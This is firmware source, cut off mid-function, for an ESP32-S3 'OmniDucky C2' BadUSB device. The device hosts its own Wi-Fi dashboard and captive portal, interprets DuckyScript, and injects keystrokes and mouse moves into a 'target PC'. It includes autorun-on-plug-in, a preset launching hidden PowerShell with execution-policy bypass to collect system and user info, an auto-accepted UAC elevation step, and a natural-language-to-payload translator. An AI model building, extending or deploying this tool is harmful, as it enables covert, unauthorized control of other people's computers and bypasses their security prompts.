/*
 * ============================================================================
 *  🦆 OmniDucky C2 — Standalone Wireless Payload OS for ESP32-S3
 * ============================================================================
 *  Flash ONCE, Control FOREVER from any Phone, Tablet, or PC.
 *  Zero Arduino IDE needed after initial flash. Zero computer required in field.
 *
 *  HOW IT WORKS:
 *  1. Plug ESP32-S3 into any USB port, charger, or target PC.
 *  2. ESP32-S3 broadcasts its own Wi-Fi Access Point: "OmniDucky-C2"
 *  3. Connect from your Phone (Password: "ducky123" or open).
 *  4. Open browser to http://192.168.4.1 (or captive portal opens automatically).
 *  5. Edit, upload, or choose any payload. Click [FIRE] to inject live!
 *  6. Click [SAVE AUTORUN] to save payload to internal flash — it will
 *     automatically execute on target machines the moment it is plugged in!
 *
 *  HARDWARE REQUIREMENTS:
 *  - ESP32-S3 Dev Board with native USB (USB-OTG)
 *  - Arduino IDE Tools Settings:
 *      * Board: ESP32S3 Dev Module
 *      * USB Mode: "USB-OTG (TinyUSB)"
 *      * USB CDC On Boot: "Disabled"
 *      * Upload Mode: "UART0 / Hardware CDC"
 * ============================================================================
 */

#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <Preferences.h>
#include "USB.h"
#include "USBHIDKeyboard.h"
#include "USBHIDMouse.h"

// ---- WI-FI ACCESS POINT CONFIGURATION ----
const char* AP_SSID = "OmniDucky-C2";
const char* AP_PASS = "ducky123";  // At least 8 chars, or set to "" for open network
const byte DNS_PORT = 53;

IPAddress apIP(192, 168, 4, 1);
IPAddress netMsk(255, 255, 255, 0);

DNSServer dnsServer;
WebServer server(80);
Preferences preferences;

// ---- HARDWARE OBJECTS ----
USBHIDKeyboard usbKeyboard;
USBHIDMouse usbMouse;

#ifndef LED_BUILTIN
#define LED_BUILTIN 2
#endif

#define BOOT_BUTTON_PIN 0

// ---- STATE ----
bool isInjecting = false;
bool autorunEnabled = true;
int calibratedWidth = 1920;
int calibratedHeight = 1080;
String currentScript = "";

// Forward declarations
void executeDuckyScript(const String& script);
void handleRoot();
void handleRun();
void handleSave();
void handleStatus();
void handleNotFound();

// ============================================================================
//  EMBEDDED WEB DASHBOARD (HTML / CSS / JS in Flash)
// ============================================================================
const char INDEX_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>OmniDucky C2 | Hardware Controller</title>
  <style>
    :root {
      --bg: #090d16;
      --card: #111827;
      --border: rgba(255,255,255,0.1);
      --accent: #38bdf8;
      --green: #10b981;
      --red: #ef4444;
      --text: #f3f4f6;
      --muted: #9ca3af;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, system-ui, sans-serif; }
    body { background: var(--bg); color: var(--text); padding: 14px; min-height: 100vh; }
    .container { max-width: 680px; margin: 0 auto; display: flex; flex-direction: column; gap: 14px; }
    
    header {
      display: flex; justify-content: space-between; align-items: center;
      padding: 12px 16px; background: var(--card); border: 1px solid var(--border); border-radius: 14px;
    }
    .brand { font-size: 18px; font-weight: 800; color: #fff; display: flex; align-items: center; gap: 8px; }
    .status-badge {
      font-size: 11px; font-weight: 700; padding: 4px 10px; border-radius: 999px;
      background: rgba(16, 185, 129, 0.15); color: var(--green); border: 1px solid rgba(16, 185, 129, 0.3);
    }
    .status-badge.busy { background: rgba(239, 68, 68, 0.15); color: var(--red); border-color: rgba(239, 68, 68, 0.3); }

    .card { background: var(--card); border: 1px solid var(--border); border-radius: 14px; padding: 16px; }
    .card-title { font-size: 14px; font-weight: 700; margin-bottom: 10px; color: var(--muted); text-transform: uppercase; letter-spacing: 0.5px; }

    .presets { display: flex; gap: 8px; overflow-x: auto; padding-bottom: 6px; }
    .preset-btn {
      background: rgba(255,255,255,0.06); border: 1px solid var(--border); color: var(--text);
      padding: 6px 12px; border-radius: 8px; font-size: 12px; font-weight: 600; white-space: nowrap; cursor: pointer;
    }
    .preset-btn:active { background: var(--accent); color: #000; }

    textarea {
      width: 100%; height: 260px; background: #030712; border: 1px solid var(--border);
      border-radius: 10px; color: #38bdf8; font-family: monospace; font-size: 13px;
      padding: 12px; line-height: 1.5; resize: vertical; outline: none; margin-top: 8px;
    }
    textarea:focus { border-color: var(--accent); }

    .btn-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 12px; }
    .btn {
      padding: 12px; border-radius: 10px; font-size: 14px; font-weight: 700; border: none; cursor: pointer;
      display: flex; align-items: center; justify-content: center; gap: 6px;
    }
    .btn-fire { background: var(--accent); color: #082f49; grid-column: span 2; font-size: 15px; }
    .btn-fire:active { background: #7dd3fc; }
    .btn-save { background: rgba(255,255,255,0.08); color: #fff; border: 1px solid var(--border); }
    .btn-clear { background: rgba(239, 68, 68, 0.1); color: var(--red); border: 1px solid rgba(239, 68, 68, 0.3); }

    .toast {
      position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
      background: var(--green); color: #fff; padding: 8px 18px; border-radius: 8px;
      font-size: 13px; font-weight: 600; opacity: 0; pointer-events: none; transition: opacity 0.3s;
    }
    .toast.show { opacity: 1; }

    /* TAB SYSTEM */
    .tabs { display: flex; gap: 6px; margin-bottom: 2px; }
    .tab-btn {
      flex: 1; padding: 10px 8px; border-radius: 10px 10px 0 0;
      border: 1px solid var(--border); border-bottom: none;
      background: rgba(255,255,255,0.03); color: var(--muted);
      font-size: 13px; font-weight: 700; cursor: pointer; text-align: center;
    }
    .tab-btn.active { background: var(--card); color: #fff; border-color: var(--accent); }
    .tab-panel { display: none; }
    .tab-panel.active { display: block; }

    /* NLP STYLES */
    .nlp-input {
      width: 100%; min-height: 120px; background: #030712; border: 1px solid var(--border);
      border-radius: 10px; color: #f3f4f6; font-family: -apple-system, system-ui, sans-serif;
      font-size: 14px; padding: 12px; line-height: 1.6; resize: vertical; outline: none; margin-top: 8px;
    }
    .nlp-input:focus { border-color: #a78bfa; }
    .nlp-output {
      width: 100%; height: 160px; background: #030712; border: 1px solid rgba(167,139,250,0.3);
      border-radius: 10px; color: #38bdf8; font-family: monospace;
      font-size: 13px; padding: 12px; line-height: 1.5; resize: vertical; outline: none; margin-top: 8px;
    }
    .nlp-label { font-size: 11px; color: var(--muted); font-weight: 600; letter-spacing: 0.5px; text-transform: uppercase; margin-top: 12px; }
    .btn-convert { background: linear-gradient(135deg, #7c3aed, #a78bfa); color: #fff; margin-top: 10px; width: 100%; }
    .btn-convert:active { opacity: 0.8; }
    .btn-use { background: rgba(167,139,250,0.15); color: #a78bfa; border: 1px solid rgba(167,139,250,0.3); margin-top: 8px; }
    .example-chips { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 10px; }
    .chip {
      background: rgba(167,139,250,0.1); border: 1px solid rgba(167,139,250,0.2);
      color: #a78bfa; padding: 4px 10px; border-radius: 999px; font-size: 11px; cursor: pointer;
    }
    .chip:active { background: rgba(167,139,250,0.3); }
  </style>
</head>
<body>
  <div class="container">
    <header>
      <div class="brand">
        <span>🦆 OmniDucky C2</span>
      </div>
      <div id="status" class="status-badge">ONLINE &bull; ARMED</div>
    </header>

    <!-- TAB BUTTONS -->
    <div class="tabs">
      <button class="tab-btn active" onclick="switchTab('ducky')">⌨️ DuckyScript</button>
      <button class="tab-btn" onclick="switchTab('nlp')">🤖 AI Translator</button>
    </div>

    <!-- TAB: DUCKYSCRIPT -->
    <div id="tab-ducky" class="tab-panel active">
      <div class="card" style="border-radius: 0 14px 14px 14px;">
        <div class="card-title">Quick Attack Presets</div>
        <div class="presets">
          <button class="preset-btn" onclick="loadPreset('notepad')">Notepad</button>
          <button class="preset-btn" onclick="loadPreset('rickroll')">Rickroll</button>
          <button class="preset-btn" onclick="loadPreset('sysinfo')">SysInfo</button>
          <button class="preset-btn" onclick="loadPreset('mobile_allow')">Mobile Allow</button>
          <button class="preset-btn" onclick="loadPreset('jiggler')">Jiggler</button>
          <button class="preset-btn" onclick="loadPreset('lock')">Lock Screen</button>
        </div>
        <textarea id="script" placeholder="// Enter DuckyScript commands here...
DELAY 1000
GUI r
DELAY 500
STRING notepad
ENTER"></textarea>
        <button class="btn btn-fire" onclick="firePayload()">🚀 FIRE PAYLOAD NOW</button>
        <div class="btn-row">
          <button class="btn btn-save" onclick="savePayload()">💾 Save as Autorun</button>
          <button class="btn btn-clear" onclick="document.getElementById('script').value = ''">Clear</button>
        </div>
      </div>
    </div>

    <!-- TAB: NLP AI TRANSLATOR -->
    <div id="tab-nlp" class="tab-panel">
      <div class="card" style="border-radius: 0 14px 14px 14px;">
        <div class="card-title" style="color: #a78bfa;">🤖 Natural Language → DuckyScript</div>
        <p style="font-size: 12px; color: var(--muted); line-height: 1.6;">
          Type what you want to do in plain English. The translator runs <b>in your browser</b> — no internet needed.
        </p>

        <div class="nlp-label">Try an example:</div>
        <div class="example-chips">
          <span class="chip" onclick="setNlp('open google and search for Vishwak Naidu')">🔍 search Vishwak Naidu (auto-select user)</span>
          <span class="chip" onclick="setNlp('open google and search for Vishwak Naidu on profile 1')">👤 search on Profile 1</span>
          <span class="chip" onclick="setNlp('open google and search for Vishwak Naidu on profile 2')">👤 search on Profile 2</span>
          <span class="chip" onclick="setNlp('open google and search for Vishwak Naidu on profile 3')">👤 search on Profile 3</span>
          <span class="chip" onclick="setNlp('click profile 2')">🖱️ click center profile</span>
          <span class="chip" onclick="setNlp('open notepad and type hello world then save it')">📝 open notepad, type hello world, save</span>
          <span class="chip" onclick="setNlp('open chrome and go to youtube.com')">🌐 open chrome and go to youtube.com</span>
          <span class="chip" onclick="setNlp('open powershell and run ipconfig')">💻 open powershell and run ipconfig</span>
          <span class="chip" onclick="setNlp('open file explorer')">📁 open file explorer</span>
          <span class="chip" onclick="setNlp('lock the screen')">🔒 lock the screen</span>
          <span class="chip" onclick="setNlp('take a screenshot')">📸 take a screenshot</span>
          <span class="chip" onclick="setNlp('open task manager')">📊 open task manager</span>
          <span class="chip" onclick="setNlp('open calculator')">🔢 open calculator</span>
        </div>

        <div class="nlp-label">Your Command (English):</div>
        <textarea class="nlp-input" id="nlp-input" placeholder="e.g. open notepad and type Hello World then save it"></textarea>

        <button class="btn btn-convert" onclick="convertNlp()">🤖 Convert to DuckyScript</button>

        <div class="nlp-label">Generated DuckyScript:</div>
        <textarea class="nlp-output" id="nlp-output" placeholder="// DuckyScript will appear here after conversion..." readonly></textarea>

        <div class="btn-row" style="margin-top: 10px;">
          <button class="btn btn-use" onclick="useNlpScript()">⬆️ Use This Script</button>
          <button class="btn btn-fire" onclick="fireNlpDirect()" style="font-size:13px;">🚀 Convert &amp; Fire</button>
        </div>
      </div>
    </div>

    <div class="card" style="font-size: 12px; color: var(--muted); line-height: 1.6;">
      <b>Field Operator Guide:</b><br>
      &bull; <b>AI Tab</b>: Type English → auto-converts to DuckyScript in your browser offline.<br>
      &bull; <b>Direct Fire</b>: Edits execute live over USB immediately on click.<br>
      &bull; <b>Autorun</b>: Saved script automatically fires when plugged into any target PC.<br>
      &bull; <b>BOOT Button</b>: Press the board's <b>BOOT (GPIO 0)</b> button to re-trigger.
    </div>
  </div>

  <div id="toast" class="toast">Command Sent!</div>

  <script>
    const PRESETS = {
      notepad: "DELAY 1000\nGUI r\nDELAY 500\nSTRING notepad\nENTER\nDELAY 800\nSTRING Hello from OmniDucky Wireless C2!\nENTER",
      rickroll: "DELAY 1000\nGUI r\nDELAY 500\nSTRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\nENTER",
      sysinfo: "DELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -NoP -W Hidden -Exec Bypass -C \"$env:COMPUTERNAME; whoami; ipconfig\" > %TEMP%\\audit.txt\nENTER",
      mobile_allow: "DELAY 1500\nGUI SPACE\nDELAY 800\nSTRING Chrome\nENTER\nDELAY 1500\nTAB\nDELAY 200\nENTER\nMOUSE_POS_PCT 50 62\nDELAY 100\nMOUSE_CLICK LEFT",
      jiggler: "REM Anti-Sleep Mouse Jiggler\nDELAY 1000\nMOUSE_MOVE 40 -40\nDELAY 500\nMOUSE_MOVE -40 40\nDELAY 500\nREPEAT 20",
      lock: "DELAY 500\nGUI l"
    };

    function loadPreset(key) {
      document.getElementById('script').value = PRESETS[key] || '';
      showToast('Loaded ' + key + ' preset');
    }

    async function firePayload() {
      const script = document.getElementById('script').value.trim();
      if (!script) { alert('Payload is empty!'); return; }
      
      setStatus('INJECTING...', true);
      showToast('Firing payload over USB...');
      try {
        const res = await fetch('/api/run', {
          method: 'POST',
          headers: { 'Content-Type': 'text/plain' },
          body: script
        });
        if (res.ok) {
          showToast('Payload Finished!');
        } else {
          alert('Execution error: ' + await res.text());
        }
      } catch (e) {
        showToast('Sent (Network busy)');
      }
      setTimeout(() => setStatus('ONLINE • ARMED', false), 1500);
    }

    async function savePayload() {
      const script = document.getElementById('script').value.trim();
      try {
        const res = await fetch('/api/save', {
          method: 'POST',
          headers: { 'Content-Type': 'text/plain' },
          body: script
        });
        showToast('Saved to flash as Autorun!');
      } catch (e) {
        alert('Save error: ' + e);
      }
    }

    async function loadSaved() {
      try {
        const res = await fetch('/api/load');
        const text = await res.text();
        if (text && text.trim().length > 0) {
          document.getElementById('script').value = text;
        } else {
          loadPreset('notepad');
        }
      } catch (e) {
        loadPreset('notepad');
      }
    }

    function setStatus(text, busy) {
      const s = document.getElementById('status');
      s.textContent = text;
      s.className = 'status-badge' + (busy ? ' busy' : '');
    }

    function showToast(msg) {
      const t = document.getElementById('toast');
      t.textContent = msg;
      t.classList.add('show');
      setTimeout(() => t.classList.remove('show'), 2000);
    }

    window.onload = loadSaved;

    // ═══════════════════════════════════════════════
    //  TAB SWITCHING
    // ═══════════════════════════════════════════════
    function switchTab(tab) {
      document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
      document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
      document.getElementById('tab-' + tab).classList.add('active');
      event.target.classList.add('active');
    }

    function setNlp(text) {
      document.getElementById('nlp-input').value = text;
    }

    function useNlpScript() {
      const out = document.getElementById('nlp-output').value.trim();
      if (!out) { alert('Convert something first!'); return; }
      document.getElementById('script').value = out;
      switchTab('ducky');
      document.querySelectorAll('.tab-btn')[0].classList.add('active');
      document.querySelectorAll('.tab-btn')[1].classList.remove('active');
      showToast('Script moved to DuckyScript tab!');
    }

    async function fireNlpDirect() {
      const out = document.getElementById('nlp-output').value.trim();
      if (!out) { convertNlp(); setTimeout(() => { const s = document.getElementById('nlp-output').value.trim(); if(s) fireScript(s); }, 100); return; }
      fireScript(out);
    }

    async function fireScript(script) {
      setStatus('INJECTING...', true);
      showToast('Firing payload over USB...');
      try {
        const res = await fetch('/api/run', { method:'POST', headers:{'Content-Type':'text/plain'}, body: script });
        showToast(res.ok ? 'Payload Finished!' : 'Error: ' + await res.text());
      } catch(e) { showToast('Sent!'); }
      setTimeout(() => setStatus('ONLINE \u2022 ARMED', false), 2000);
    }

    // ═══════════════════════════════════════════════
    //  NLP ENGINE — Runs entirely in the browser
    //  No internet needed. Translates English to DuckyScript.
    // ═══════════════════════════════════════════════
    function convertNlp() {
      const input = document.getElementById('nlp-input').value.trim().toLowerCase();
      if (!input) { alert('Enter a command in English first!'); return; }
      const result = nlpToDucky(input);
      document.getElementById('nlp-output').value = result;
      showToast('Converted to DuckyScript!');
    }

    function nlpToDucky(text) {
      const lines = ['REM Generated by OmniDucky NLP Engine', 'DEFAULT_DELAY 80'];
      const t = text.toLowerCase();

      // ── CHROME MULTI-USER PROFILE DETECTION ──
      // Profile 1 (left) = ~42%, Profile 2 (center) = 50%, Profile 3 (right) = ~58%
      let profilePctX = 50; // default center profile
      if (t.includes('profile 1') || t.includes('first profile') || t.includes('user 1')) {
        profilePctX = 42;
      } else if (t.includes('profile 3') || t.includes('third profile') || t.includes('user 3')) {
        profilePctX = 58;
      } else if (t.includes('profile 2') || t.includes('second profile') || t.includes('user 2')) {
        profilePctX = 50;
      }

      // Direct profile selection command: e.g. "click profile 1", "select profile 2"
      if (/^(?:click|select|choose)\s+(?:profile|user)/i.test(t) && !t.includes('search') && !t.includes('open')) {
        lines.push('REM Mouse-click Chrome user profile',
                   'SCREEN_SIZE 1920 1080',
                   'MOUSE_POS_PCT ' + profilePctX + ' 50', 'DELAY 200',
                   'MOUSE_CLICK LEFT', 'DELAY 300',
                   'ENTER');
        return lines.join('\n');
      }

      // ── GOOGLE / WEB SEARCH ──
      // e.g. "open google and search for Vishwak Naidu"
      //      "open google and search for Vishwak Naidu on profile 1"
      //      "search for weather today on google"
      const searchMatch = t.match(/(?:search\s+(?:for\s+)?|google\s+)(.+?)(?:\s+on\s+(?:google|chrome|the\s+web))?$/i)
                       || t.match(/(?:open\s+google\s+and\s+search\s+for\s+)(.+?)$/i);
      if (searchMatch) {
        let cleanQuery = searchMatch[1].trim();
        cleanQuery = cleanQuery.replace(/\s+(?:on\s+)?(?:profile|user)\s+[123]/i, '');
        const query = encodeURIComponent(cleanQuery).replace(/%20/g, '+');
        lines.push('GUI r', 'DELAY 600', 'STRINGLN chrome', 'DELAY 2500',
                   'REM Click user profile avatar with mouse (handles Chrome multi-profile)',
                   'SCREEN_SIZE 1920 1080',
                   'MOUSE_POS_PCT ' + profilePctX + ' 50', 'DELAY 200',
                   'MOUSE_CLICK LEFT', 'DELAY 300',
                   'ENTER', 'DELAY 2000',
                   'CTRL l', 'DELAY 400',
                   'STRING https://www.google.com/search?q=' + query,
                   'ENTER', 'DELAY 1500');
      }

      // ── OPEN APPLICATIONS ──
      const openMatch = t.match(/open\s+(notepad|note\s*pad)/);
      if (openMatch) {
        lines.push('GUI r', 'DELAY 600', 'STRINGLN notepad', 'DELAY 2500');
      }

      const calcMatch = t.match(/open\s+(calc|calculator)/);
      if (calcMatch) {
        lines.push('GUI r', 'DELAY 600', 'STRINGLN calc', 'DELAY 1000');
      }

      const explorerMatch = t.match(/open\s+(file\s*explorer|explorer|files)/);
      if (explorerMatch) {
        lines.push('GUI e', 'DELAY 1000');
      }

      const taskMgrMatch = t.match(/open\s+(task\s*manager|taskmgr)/);
      if (taskMgrMatch) {
        lines.push('CTRL-ALT ESCAPE', 'DELAY 1000');
      }

      const powershellMatch = t.match(/(open|launch|run)\s+(powershell|ps|shell)/);
      if (powershellMatch) {
        lines.push('GUI r', 'DELAY 600', 'STRINGLN powershell', 'DELAY 2000');
        // If "run X" or "and run X" follows, type that command
        const psCmd = t.match(/(?:powershell|shell|ps)\s+and\s+run\s+(.+?)(?:\s+and\b|$)/i)
                   || t.match(/(?:open|launch)\s+powershell\s+and\s+(?:run|type|execute)\s+(.+?)(?:\s+and\b|$)/i);
        if (psCmd) {
          lines.push('DELAY 500', 'STRINGLN ' + psCmd[1].trim());
        }
      }

      const cmdMatch = t.match(/(open|launch|run)\s+(cmd|command\s*prompt|terminal)/);
      if (cmdMatch) {
        lines.push('GUI r', 'DELAY 600', 'STRINGLN cmd', 'DELAY 1000');
      }

      const chromeMatch = t.match(/(open|launch)\s+(chrome|google\s*chrome|browser)/);
      if (chromeMatch && !searchMatch) {
        lines.push('GUI r', 'DELAY 600', 'STRINGLN chrome', 'DELAY 2500',
                   'REM Click user profile avatar with mouse (handles Chrome multi-profile)',
                   'SCREEN_SIZE 1920 1080',
                   'MOUSE_POS_PCT ' + profilePctX + ' 50', 'DELAY 200',
                   'MOUSE_CLICK LEFT', 'DELAY 300',
                   'ENTER', 'DELAY 2000');
      }

      const edgeMatch = t.match(/(open|launch)\s+(edge|microsoft\s*edge)/);
      if (edgeMatch) {
        lines.push('GUI r', 'DELAY 600', 'STRINGLN msedge', 'DELAY 2000');
      }

      const runMatch = t.match(/open\s+(run|run\s*dialog|win\+r)/);
      if (runMatch) {
        lines.push('GUI r', 'DELAY 600');
      }

      // ── NAVIGATE TO URL ──
      const urlMatch = t.match(/(?:go\s+to|navigate\s+to|visit|open)\s+(https?:\/\/[^\s]+|[\w\-]+\.[a-z]{2,}[^\s]*)/i);
      if (urlMatch && !searchMatch) {
        const url = urlMatch[1].includes('://') ? urlMatch[1] : 'https://' + urlMatch[1];
        // If a browser was opened, focus the address bar first with CTRL+L
        if (chromeMatch || edgeMatch) {
          lines.push('CTRL l', 'DELAY 400');
        }
        lines.push('STRING ' + url, 'ENTER', 'DELAY 1500');
      }

      // ── TYPE TEXT ──
      // Fix: use non-greedy match ending at "and|then" OR end-of-string ($)
      // Previous bug: \s+$ required whitespace before end which never matched.
      const typeMatch = t.match(/(?:type|write|enter|say)\s+["']?(.+?)["']?(?:\s+(?:and\b|then\b)|$)/i);
      if (typeMatch) {
        lines.push('DELAY 500', 'STRING ' + typeMatch[1].trim());
      }

      // ── PRESS ENTER / SUBMIT ──
      if (/(?:press\s+enter|hit\s+enter|submit|confirm)/.test(t)) {
        lines.push('ENTER');
      }

      // ── SAVE FILE ──
      if (/save\s+(?:it|the\s+file|file|document)?/.test(t)) {
        lines.push('DELAY 300', 'CTRL s', 'DELAY 500');
      }

      // ── COPY / PASTE ──
      if (/copy\s+(?:all|everything|it)?/.test(t)) {
        lines.push('CTRL a', 'DELAY 100', 'CTRL c');
      }
      if (/paste/.test(t)) {
        lines.push('CTRL v');
      }

      // ── CLOSE WINDOW ──
      if (/close\s+(?:window|tab|app|it)?/.test(t)) {
        lines.push('ALT F4');
      }

      // ── LOCK SCREEN ──
      if (/lock\s+(?:screen|computer|pc|the\s+screen)?/.test(t)) {
        lines.push('GUI l');
      }

      // ── SCREENSHOT ──
      if (/(?:take\s+a?\s*|grab\s+a?\s*)?screenshot/.test(t)) {
        lines.push('GUI PRINTSCREEN', 'DELAY 500');
      }

      // ── MINIMIZE / MAXIMIZE ──
      if (/minimize\s+(?:all|windows|everything)?/.test(t)) {
        lines.push('GUI d');
      }
      if (/maximize/.test(t)) {
        lines.push('GUI UP');
      }

      // ── SLEEP / DELAY ──
      const delayMatch = t.match(/wait\s+(\d+)\s*(seconds?|ms|milliseconds?)?/);
      if (delayMatch) {
        const ms = delayMatch[2] && delayMatch[2].startsWith('ms') ? parseInt(delayMatch[1]) : parseInt(delayMatch[1]) * 1000;
        lines.push('DELAY ' + ms);
      }

      // ── MOUSE JIGGLER ──
      if (/jiggl|wiggl|mouse\s*jiggl/.test(t)) {
        lines.push('MOUSE_MOVE 50 0', 'DELAY 300', 'MOUSE_MOVE -50 0', 'DELAY 300', 'REPEAT 10');
      }

      // ── CLICK ──
      if (/(?:left\s*)?click/.test(t) && !/right\s*click/.test(t)) {
        lines.push('MOUSE_CLICK LEFT');
      }
      if (/right\s*click/.test(t)) {
        lines.push('MOUSE_CLICK RIGHT');
      }

      // ── ADMIN / RUN AS ADMIN ──
      if (/(?:admin|as\s+admin|administrator|elevated)/.test(t)) {
        lines.push('CTRL-SHIFT ENTER', 'DELAY 1000', 'ALT y');
      }

      // If nothing matched, return a helpful message
      if (lines.length === 2) {
        lines.push('REM Could not parse: ' + text);
        lines.push('REM Try: "open notepad and type hello" or "lock the screen"');
      }

      return lines.join('\n');
    }
  </script>
</body>
</html>
)rawliteral";

// ============================================================================
//  ARDUINO SETUP & MAIN LOOP
// ============================================================================
void setup() {
  Serial.begin(115200);
  pinMode(LED_BUILTIN, OUTPUT);
  pinMode(BOOT_BUTTON_PIN, INPUT_PULLUP);

  // 1. Initialize USB HID Keyboard & Mouse
  usbKeyboard.begin();
  usbMouse.begin();
  USB.begin();

  // 2. Load stored Autorun payload from non-volatile flash
  preferences.begin("omniducky", false);
  currentScript = preferences.getString("autorun", "");
  autorunEnabled = preferences.getBool("auto_enabled", true);

  // 3. Configure Wi-Fi SoftAP
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, netMsk);
  WiFi.softAP(AP_SSID, (strlen(AP_PASS) > 0 ? AP_PASS : NULL));

  Serial.println("[+] OmniDucky C2 Online!");
  Serial.print("[+] Wi-Fi AP: "); Serial.println(AP_SSID);
  Serial.print("[+] Dashboard: http://"); Serial.println(WiFi.softAPIP());

  // 4. Captive Portal DNS Server (redirects all domains to 192.168.4.1)
  dnsServer.start(DNS_PORT, "*", apIP);

  // 5. Web Server Routes
  server.on("/", HTTP_GET, handleRoot);
  server.on("/api/run", HTTP_POST, handleRun);
  server.on("/api/save", HTTP_POST, handleSave);
  server.on("/api/load", HTTP_GET, []() {
    server.send(200, "text/plain", currentScript);
  });
  server.on("/api/status", HTTP_GET, handleStatus);
  server.onNotFound(handleNotFound);
  server.begin();

  // 6. Autorun Execution (if plugged into target PC)
  delay(1500); // Give USB time to enumerate on host
  if (autorunEnabled && currentScript.length() > 0) {
    Serial.println("[*] Executing Autorun payload from flash...");
    executeDuckyScript(currentScript);
  }
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  // Re-trigger via physical BOOT button (GPIO 0)
  if (digitalRead(BOOT_BUTTON_PIN) == LOW) {
    delay(400); // debounce
    if (currentScript.length() > 0) {
      Serial.println("[*] BOOT button triggered: Executing payload...");
      executeDuckyScript(currentScript);
    }
  }
}

// ============================================================================
//  WEB SERVER HANDLERS
// ============================================================================
void handleRoot() {
  server.send_P(200, "text/html", INDEX_HTML);
}

void handleRun() {
  if (server.hasArg("plain")) {
    String script = server.arg("plain");
    server.send(200, "text/plain", "Executing payload...");
    executeDuckyScript(script);
  } else {
    server.send(400, "text/plain", "Missing script payload");
  }
}

void handleSave() {
  if (server.hasArg("plain")) {
    currentScript = server.arg("plain");
    preferences.putString("autorun", currentScript);
    server.send(200, "text/plain", "Saved as Autorun");
  } else {
    server.send(400, "text/plain", "Missing script payload");
  }
}

void handleStatus() {
  String json = "{\"status\":\"online\",\"injecting\":" + String(isInjecting ? "true" : "false") + "}";
  server.send(200, "application/json", json);
}

void handleNotFound() {
  // Captive Portal Redirect
  server.sendHeader("Location", "http://192.168.4.1/", true);
  server.send(302, "text/plain", "");
}

// ============================================================================
//  ON-CHIP DUCKY SCRIPT INTERPRETER
// ============================================================================
void moveToScreenPercent(float pctX, float pctY, int screenW, int screenH) {
  // Corner-reset: slam to (0,0)
  for (int i = 0; i < 25; i++) {
    usbMouse.move(-120, -120);
    delay(5);
  }
  delay(80);

  int targetX = (int)((pctX / 100.0f) * screenW);
  int targetY = (int)((pctY / 100.0f) * screenH);

  while (targetX > 0 || targetY > 0) {
    int stepX = (targetX > 100) ? 100 : targetX;
    int stepY = (targetY > 100) ? 100 : targetY;
    usbMouse.move(stepX, stepY);
    targetX -= stepX;
    targetY -= stepY;
    delay(5);
  }
  delay(50);
}

void pressModifier(const String& mod) {
  if (mod == "GUI" || mod == "WIN" || mod == "WINDOWS" || mod == "COMMAND") usbKeyboard.press(KEY_LEFT_GUI);
  else if (mod == "CTRL" || mod == "CONTROL") usbKeyboard.press(KEY_LEFT_CTRL);
  else if (mod == "ALT") usbKeyboard.press(KEY_LEFT_ALT);
  else if (mod == "SHIFT") usbKeyboard.press(KEY_LEFT_SHIFT);
}

void pressKey(const String& key) {
  if (key == "ENTER" || key == "RETURN") usbKeyboard.press(KEY_RETURN);
  else if (key == "ESCAPE" || key == "ESC") usbKeyboard.press(KEY_ESC);
  else if (key == "BACKSPACE") usbKeyboard.press(KEY_BACKSPACE);
  else if (key == "TAB") usbKeyboard.press(KEY_TAB);
  else if (key == "SPACE") usbKeyboard.press(' ');
  else if (key == "CAPSLOCK") usbKeyboard.press(KEY_CAPS_LOCK);
  else if (key == "DELETE" || key == "DEL") usbKeyboard.press(KEY_DELETE);
  else if (key == "PRINTSCREEN") usbKeyboard.press(KEY_PRINT_SCREEN);
  else if (key == "UPARROW" || key == "UP") usbKeyboard.press(KEY_UP_ARROW);
  else if (key == "DOWNARROW" || key == "DOWN") usbKeyboard.press(KEY_DOWN_ARROW);
  else if (key == "LEFTARROW" || key == "LEFT") usbKeyboard.press(KEY_LEFT_ARROW);
  else if (key == "RIGHTARROW" || key == "RIGHT") usbKeyboard.press(KEY_RIGHT_ARROW);
  else if (key.length() == 1) usbKeyboard.press(key[0]);
}

void executeDuckyScript(const String& script) {
  isInjecting = true;
  digitalWrite(LED_BUILTIN, HIGH);

  int defaultDelay = 0;
  String prevLine = "";
  int startIdx = 0;

  while (startIdx < script.length()) {
    int endIdx = script.indexOf('\n', startIdx);
    if (endIdx == -1) endIdx = script.length();

    String line = script.substring(startIdx, endIdx);
    line.trim();
    startIdx = endIdx + 1;

    if (line.length() == 0 || line.startsWith("REM")) continue;

    if (defaultDelay > 0) delay(defaultDelay);

    // DELAY <ms>
    if (line.startsWith("DELAY ")) {
      int ms = line.substring(6).toInt();
      delay(ms);
    }
    // DEFAULT_DELAY <ms>
    else if (line.startsWith("DEFAULT_DELAY ") || line.startsWith("DEFAULTDELAY ")) {
      defaultDelay = line.substring(line.indexOf(' ') + 1).toInt();
    }
    // STRING <text>
    else if (line.startsWith("STRING ")) {
      String text = line.substring(7);
      for (int i = 0; i < text.length(); i++) {
        usbKeyboard.press(text[i]);
        delay(6);
        usbKeyboard.release(text[i]);
        delay(6);
      }
    }
    // STRINGLN <text>
    else if (line.startsWith("STRINGLN ")) {
      String text = line.substring(9);
      for (int i = 0; i < text.length(); i++) {
        usbKeyboard.press(text[i]);
        delay(6);
        usbKeyboard.release(text[i]);
        delay(6);
      }
      usbKeyboard.press(KEY_RETURN);
      delay(20);
      usbKeyboard.release(KEY_RETURN);
    }
    // SCREEN_SIZE <w> <h>
    else if (line.startsWith("SCREEN_SIZE ")) {
      String args = line.substring(12);
      int sp = args.indexOf(' ');
      if (sp > 0) {
        calibratedWidth = args.substring(0, sp).toInt();
        calibratedHeight = args.substring(sp + 1).toInt();
      }
    }
    // MOUSE_POS_PCT <pctX> <pctY>
    else if (line.startsWith("MOUSE_POS_PCT ")) {
      String args = line.substring(14);
      int sp = args.indexOf(' ');
      if (sp > 0) {
